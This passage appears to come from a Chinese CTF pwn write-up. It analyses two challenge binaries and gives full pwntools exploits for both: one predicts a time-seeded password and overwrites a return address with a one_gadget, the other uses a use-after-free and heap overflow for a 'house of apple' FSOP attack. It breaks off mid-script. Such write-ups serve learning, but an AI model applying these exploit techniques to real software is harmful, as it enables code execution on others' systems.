        <content type="html"><![CDATA[<p><code>houseofsome</code>实在是不会就放弃咯</p><h2 id="nmanager"><a href="#nmanager" class="headerlink" title="nmanager"></a>nmanager</h2><p>检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE <span class="token punctuation">(</span>0x3fe000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>pass</code>可以被预测</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v3 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>pss<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>pss<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    pss<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> characters<span class="token punctuation">[</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">00000000</span> Data            struc <span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span> mappedto_8<span class="token punctuation">)</span><span class="token number">00000000</span> gender          db <span class="token number">32</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token number">00000020</span> age             dq <span class="token operator">?</span><span class="token number">00000028</span> name            db <span class="token number">64</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token number">00000068</span> Data            ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>联合<code>C</code>编程，过<code>check</code>（不成功再运行几次）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>char <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>pss <span class="token operator">=</span> char<span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input password: '</span><span class="token punctuation">,</span> pss<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>modify</code>函数可以多次修改可控地址内容并且输出输入的内容，当<code>name</code>长度为<code>0x10</code>时可以泄露<code>libc</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"## select the idx you want modify ##"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"gender: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x78LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"age: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span> <span class="token number">120LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x78LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>      <span class="token string">"[idx%d]:\nname: %s\nage: %lld\ngender: %s\n"</span><span class="token punctuation">,</span>      <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>n<span class="token punctuation">,</span>      <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">120LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">120LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">120LL</span> <span class="token operator">*</span> n <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"quit now?(Y/y)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">3uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token char">'y'</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>read</code>下断点计算输入地址与返回地址的偏移来计算<code>idx</code>，覆盖返回地址为<code>ogg</code>即可，如果<code>n=8</code>直接填<code>ogg</code>程序会卡在<code>[rbp - 0x78]</code>，调试后发现在<code>ogg</code>前<code>0x8</code>填充一个合理地址即可。由于地址随机化所以计算的偏移要多运行几次才能再次重合</p><p>完整exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'8.147.135.190'</span><span class="token punctuation">,</span> <span class="token number">34466</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>char <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>pss <span class="token operator">=</span> char<span class="token punctuation">[</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">;</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input password: '</span><span class="token punctuation">,</span> pss<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'select the idx you want modify'</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'gender: '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'age: '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'name: aaaaaaaaaaaaaaaa'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x22a530</span>li<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'quit now?(Y/y)'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50a37</span><span class="token punctuation">,</span> <span class="token number">0xebcf1</span><span class="token punctuation">,</span> <span class="token number">0xebcf5</span><span class="token punctuation">,</span> <span class="token number">0xebcf8</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.35/2.35-0ubuntu3_amd64/libc.so.6'</span><span class="token punctuation">)</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'select the idx you want modify'</span><span class="token punctuation">,</span> <span class="token string">b'8'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'gender: '</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x404000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'age: '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'name: '</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'quit now?(Y/y)'</span><span class="token punctuation">,</span> <span class="token string">b'y'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>uaf漏洞</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heap<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// uaf</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>堆溢出漏洞</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">my_read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>heap<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> chunk<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//heap overflow</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>_IO_list_all</code>链接到<code>fastbin</code>上之后进行<code>house of apple</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>menu <span class="token operator">=</span> <span class="token string">'> '</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'what size :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>menu<span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x219ce0</span>li<span class="token punctuation">(</span><span class="token string">'unsortedbin_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>li<span class="token punctuation">(</span><span class="token string">'_IO_list_all = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>_IO_list_all<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>key <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> key <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>li<span class="token punctuation">(</span><span class="token string">'heap_base = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>key <span class="token operator">^</span> _IO_list_all<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span>target_addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0xc30</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>_IO_wfile_jumps <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_wfile_jumps'</span><span class="token punctuation">]</span>p2 <span class="token operator">=</span> <span class="token string">b'\\x00'</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_wfile_jumps<span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xe0</span> <span class="token operator">+</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">b'\\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">+</span> <span class="token number">0x210</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span 